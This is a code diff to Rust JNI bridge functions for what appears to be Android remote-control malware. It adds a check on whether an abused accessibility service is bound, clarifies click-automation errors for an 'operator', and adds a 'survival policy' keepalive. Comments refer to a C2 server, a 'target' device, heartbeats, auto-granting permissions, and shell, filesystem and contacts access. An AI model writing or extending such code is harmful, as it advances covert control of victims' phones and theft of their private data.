@@ -149,6 +149,13 @@ fn call_bridge_bool(method: &str, args: &[JValue]) -> bool {
 fn proto_for(method: &str) -> String {
     match method {
         "clickByText" | "clickNodeById" => "(Ljava/lang/String;)Z".into(),
+        // KeepAlive.a11yBound(): Boolean -- no-arg, so it must NOT share the arm
+        // above; a descriptor that disagrees with the Kotlin declaration resolves to
+        // NoSuchMethodError, which the operator only ever sees as a generic throw.
+        "a11yBound" => "()Z".into(),
+        // KeepAlive.evaluate(): String -- re-applies the survival policy and reports
+        // SILENT / DEGRADED / UNKNOWN.
+        "keepAliveEvaluate" => "()Ljava/lang/String;".into(),
         // ShadowBridge.openGrantScreen(kind: String): String -- parameterised, so it
         // must be listed explicitly rather than left to the catch-all below.
         "openGrantScreen" => "(Ljava/lang/String;)Ljava/lang/String;".into(),
@@ -187,7 +194,17 @@ pub fn a11y_click_text(needle: &str) -> String {
         Err(e) => return format!("jni: new_string failed: {}", e),
     };
     let ok = call_bridge_bool("clickByText", &[JValue::Object(&jneedle)]);
-    if ok { "clicked".into() } else { "no matching clickable node".into() }
+    if ok {
+        "clicked".into()
+    } else if !a11y_bound() {
+        // A false return here means two completely different things -- "nothing
+        // matched" and "there was no service to ask". Reporting the first when the
+        // second is true is precisely the silent failure this project keeps
+        // paying for, so disambiguate before interpreting the boolean.
+        "UNSUPPORTED: accessibility service not bound -- click needs it; shell/fs/contacts unaffected".into()
+    } else {
+        "no matching clickable node".into()
+    }
 }
 
 pub fn a11y_click_id(view_id: &str) -> String {
@@ -204,7 +221,29 @@ pub fn a11y_click_id(view_id: &str) -> String {
         Err(e) => return format!("jni: new_string failed: {}", e),
     };
     let ok = call_bridge_bool("clickNodeById", &[JValue::Object(&jid)]);
-    if ok { "clicked".into() } else { "node not found".into() }
+    if ok {
+        "clicked".into()
+    } else if !a11y_bound() {
+        "UNSUPPORTED: accessibility service not bound -- click needs it; shell/fs/contacts unaffected".into()
+    } else {
+        "node not found".into()
+    }
+}
+
+/// True while AMS holds a live instance of our accessibility service.
+///
+/// The heartbeat carries this so the operator can tell "target unreachable"
+/// (DEAD) from "target reachable, UI automation unavailable" (DEGRADED). The
+/// answer comes from the process itself rather than being inferred C2-side: the
+/// binding state is only ever known here.
+pub fn a11y_bound() -> bool {
+    call_bridge_bool("a11yBound", &[])
+}
+
+/// Re-apply the survival policy (start the foreground fallback if a11y is down,
+/// drop it if a11y is back). Returns SILENT / DEGRADED / UNKNOWN.
+pub fn keepalive_tick() -> String {
+    call_bridge_string("keepAliveEvaluate", &[])
 }
 
 pub fn a11y_start_autogrant() -> String {
